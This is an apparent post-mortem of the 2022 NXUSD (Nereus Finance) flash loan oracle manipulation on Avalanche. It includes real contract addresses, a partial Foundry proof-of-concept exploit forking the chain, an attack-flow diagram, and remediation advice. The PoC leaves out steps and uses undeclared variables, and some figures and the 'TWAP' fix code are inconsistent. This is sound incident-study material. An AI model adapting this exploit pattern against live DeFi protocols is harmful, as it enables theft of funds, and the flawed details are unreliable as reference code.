# NXUSD (Nereus Finance) — Flash Loan Oracle Manipulation Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2022-09 |
| **Protocol** | Nereus Finance (NXUSD Stablecoin) |
| **Chain** | Avalanche |
| **Loss** | ~998,000 NXUSD |
| **AAVE Lending Pool** | [0x794a61358D6845594F94dc1DB02A252b5b4814aD](https://snowtrace.io/address/0x794a61358D6845594F94dc1DB02A252b5b4814aD) |
| **Uniswap V2 Router** | [0x60aE616a2155Ee3d9A68541Ba4544862310933d4](https://snowtrace.io/address/0x60aE616a2155Ee3d9A68541Ba4544862310933d4) |
| **WAVAX/USDC Pair** | [0xf4003F4efBE8691B60249E6afbD307aBE7758adb](https://snowtrace.io/address/0xf4003F4efBE8691B60249E6afbD307aBE7758adb) |
| **DegenBox** | [0x0B1F9C2211F77Ec3Fa2719671c5646cf6e59B775](https://snowtrace.io/address/0x0B1F9C2211F77Ec3Fa2719671c5646cf6e59B775) |
| **Cauldron V2** | [0xC0A7a7F141b6A5Bce3EC1B81823c8AFA456B6930](https://snowtrace.io/address/0xC0A7a7F141b6A5Bce3EC1B81823c8AFA456B6930) |
| **Curve Pool 1** | [0x001E3BA199B4FF4B5B6e97aCD96daFC0E2e4156e](https://snowtrace.io/address/0x001E3BA199B4FF4B5B6e97aCD96daFC0E2e4156e) |
| **Curve Pool 2** | [0x3a43A5851A3e3E0e25A3c1089670269786be1577](https://snowtrace.io/address/0x3a43A5851A3e3E0e25A3c1089670269786be1577) |
| **WAVAX** | [0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7](https://snowtrace.io/address/0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7) |
| **USDC** | [0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E](https://snowtrace.io/address/0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E) |
| **NXUSD** | [0xF14f4CE569cB3679E99d5059909E23B07bd2F387](https://snowtrace.io/address/0xF14f4CE569cB3679E99d5059909E23B07bd2F387) |
| **Root Cause** | `updateExchangeRate()` + `cook()` use a manipulable AMM spot price as the oracle |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-09/NXUSD_exp.sol) |

---
## 1. Vulnerability Overview

Nereus Finance is an Abracadabra/Cauldron V2 fork protocol that mints NXUSD (a USD-pegged stablecoin) using WAVAX as collateral. The `updateExchangeRate()` function used the spot price from the WAVAX/USDC Uniswap V2 pair as its oracle to value WAVAX collateral. The attacker flash-borrowed 51 trillion USDC units from AAVE, purchased WAVAX in bulk to artificially inflate the WAVAX/USDC spot price. In this state, a small amount of WAVAX was provided as overvalued collateral via `cook()`, and 998,000 NXUSD was borrowed. The attacker then converted the NXUSD to USDC via Curve, repaid the flash loan, and pocketed the profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable updateExchangeRate() - uses AMM spot price
contract CauldronV2 {
    function updateExchangeRate() public returns (bool updated, uint256 rate) {
        // ❌ Calculates spot price using getReserves() from the Uniswap V2 pair
        // During a large flash loan purchase, reserves are temporarily distorted
        (uint112 reserve0, uint112 reserve1, ) = wavaxUsdcPair.getReserves();
        rate = uint256(reserve1) * 1e18 / uint256(reserve0); // USDC per WAVAX
        exchangeRate = rate;
        updated = true;
    }

    // ❌ cook() immediately uses updateExchangeRate() result for collateral valuation
    function cook(
        uint8[] calldata actions,
        uint256[] calldata values,
        bytes[] calldata datas
    ) external payable {
        for (uint i = 0; i < actions.length; i++) {
            if (actions[i] == ACTION_UPDATE_EXCHANGE_RATE) {
                updateExchangeRate(); // ❌ Updates with manipulated price
            } else if (actions[i] == ACTION_BORROW) {
                // ❌ Calculates max borrow amount using the just-manipulated exchangeRate
                uint256 maxBorrow = collateral * exchangeRate / LIQUIDATION_MULTIPLIER;
                _borrow(maxBorrow);
            }
        }
    }
}

// ✅ Correct pattern - use TWAP oracle
function updateExchangeRate() public returns (bool updated, uint256 rate) {
    // ✅ Use Time-Weighted Average Price (TWAP) to prevent short-term manipulation
    rate = IChainlinkAggregator(chainlinkFeed).latestAnswer();
    // Or Uniswap V3 TWAP
    rate = IUniswapV3Pool(wavaxUsdcPool).observe(secondsAgo);
}
```

---
### On-Chain Source Code

Source: Sourcify verified


**DegenBox.sol** — Entry point:
```solidity
// ❌ Root cause: `updateExchangeRate()` + `cook()` use a manipulable AMM spot price as the oracle
    function safeTransfer(
        IERC20 token,
        address to,
        uint256 amount
    ) internal {
        (bool success, bytes memory data) = address(token).call(abi.encodeWithSelector(SIG_TRANSFER, to, amount));  // ❌ External call — reentrancy possible
        require(success && (data.length == 0 || abi.decode(data, (bool))), "BoringERC20: Transfer failed");
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash borrow 51 trillion USDC units from AAVE
    │       (enter executeOperation() callback)
    │
    ├─[2] Swap large amount of USDC → WAVAX (Uniswap V2)
    │       └─ Artificially inflate WAVAX/USDC spot price
    │           (WAVAX price surges ~10x)
    │
    ├─[3] Deposit some WAVAX as collateral to Cauldron V2
    │       └─ DegenBox.deposit(WAVAX, cauldron, amount)
    │
    ├─[4] Call Cauldron.cook([UPDATE_EXCHANGE_RATE, BORROW])
    │       ├─ updateExchangeRate(): reflects manipulated WAVAX price
    │       └─ _borrow(998,000 NXUSD)
    │           ❌ Collateral WAVAX overvalued at manipulated price
    │
    ├─[5] Convert 998,000 NXUSD → Curve → USDC
    │       (via avCRV, USDC_e)
    │
    ├─[6] Reverse swap USDC → WAVAX (price normalization)
    │
    └─[7] Repay AAVE flash loan and secure net USDC profit
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface ILendingPool {
    function flashLoan(
        address receiver,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface ICauldronV2 {
    function updateExchangeRate() external returns (bool, uint256);
    function cook(
        uint8[] calldata actions,
        uint256[] calldata values,
        bytes[] calldata datas
    ) external payable returns (uint256, uint256);
}

interface IDegenBox {
    function deposit(address token, address from, address to, uint256 amount, uint256 share)
        external returns (uint256, uint256);
}

contract NXUSDExploit is Test {
    ILendingPool aave = ILendingPool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    ICauldronV2 cauldron = ICauldronV2(0xC0A7a7F141b6A5Bce3EC1B81823c8AFA456B6930);
    IDegenBox degenBox = IDegenBox(0x0B1F9C2211F77Ec3Fa2719671c5646cf6e59B775);

    function setUp() public {
        vm.createSelectFork("avalanche", 19_613_451);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDC balance", usdc.balanceOf(address(this)), 6);

        // [Step 1] Flash borrow 51 trillion USDC units from AAVE
        address[] memory assets = new address[](1);
        assets[0] = address(usdc);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 51_000_000 * 1e6; // 51M USDC
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        aave.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);

        emit log_named_decimal_uint("[End] USDC balance", usdc.balanceOf(address(this)), 6);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // [Step 2] Swap large USDC → WAVAX (price manipulation)
        // uniRouter.swapExactTokensForTokens(largeUSDC, 0, [usdc, wavax], ...)

        // [Step 3] Deposit WAVAX as Cauldron collateral
        wavax.approve(address(degenBox), type(uint256).max);
        degenBox.deposit(address(wavax), address(this), address(cauldron), wavaxAmount, 0);

        // [Step 4] Price update + borrow via cook()
        // ⚡ updateExchangeRate() reflects the manipulated spot price
        uint8[] memory actions = new uint8[](2);
        actions[0] = 11; // ACTION_UPDATE_EXCHANGE_RATE
        actions[1] = 5;  // ACTION_BORROW
        cauldron.cook(actions, new uint256[](2), datas);
        // Successfully borrowed 998,000 NXUSD

        // [Step 5] Convert NXUSD → Curve → USDC

        // [Step 6] Reverse WAVAX swap to normalize price

        // [Step 7] Repay AAVE
        usdc.approve(address(aave), amounts[0] + premiums[0]);
        return true;
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Flash loan-based AMM oracle manipulation |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **OWASP DeFi** | Price Oracle Manipulation |
| **Attack Vector** | AAVE flash loan → bulk WAVAX purchase → `updateExchangeRate()` → `cook()` borrow |
| **Preconditions** | `updateExchangeRate()` uses AMM spot price; `cook()` allows price update followed by borrowing within the same transaction |
| **Impact** | 998,000 NXUSD illegitimately borrowed |

---
## 6. Remediation Recommendations

1. **Use TWAP Oracle**: Use a trusted external oracle such as Chainlink or Uniswap V3's TWAP to prevent short-term price manipulation.
2. **Limit Price Deviation**: Set a maximum allowable deviation from the previous price and cause `updateExchangeRate()` to revert on sudden price movements.
3. **Block Update-Borrow in the Same Transaction**: Introduce a block or time delay to prevent price updates and collateral borrowing from occurring within the same transaction.

```solidity
// ✅ Use Chainlink oracle
function updateExchangeRate() public returns (bool updated, uint256 rate) {
    (, int256 answer, , uint256 updatedAt, ) = chainlinkFeed.latestRoundData();
    require(block.timestamp - updatedAt <= 3600, "Stale price");
    require(answer > 0, "Invalid price");
    rate = uint256(answer) * 1e10; // 8 decimals → 18 decimals
    exchangeRate = rate;
    updated = true;
}
```

---
## 7. Lessons Learned

- **Oracle Risk in Abracadabra/Cauldron Forks**: Cauldron V2 fork protocols frequently use spot prices when customizing their oracle configurations. The oracle security design of the original protocol must be preserved as-is.
- **Risk of Composite Actions in cook()**: Cauldron's `cook()` function executes multiple actions sequentially within a single transaction. When `UPDATE_EXCHANGE_RATE` and `BORROW` are permitted together, borrowing against a manipulated price becomes immediately possible.
- **Avalanche DeFi Ecosystem**: This incident occurred in a major stablecoin protocol on Avalanche, demonstrating that flash loan-based oracle manipulation works identically not only on Ethereum but across other EVM-compatible chains.